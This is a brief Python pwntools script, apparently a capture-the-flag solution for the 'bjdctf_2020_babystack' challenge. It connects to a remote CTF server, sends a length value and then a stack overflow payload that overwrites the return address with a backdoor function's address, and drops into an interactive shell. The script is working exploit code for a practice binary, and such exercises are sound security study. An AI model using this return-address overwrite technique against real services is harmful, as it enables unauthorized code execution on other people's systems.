from pwn import *


# p = process("./bjdctf_2020_babystack")
p = remote("node4.buuoj.cn", 28329)


back_door = 0x00000000004006E6

p.sendline("64")
pad = cyclic(0x10+0x8)+p64(back_door)
p.send(pad)

p.interactive()

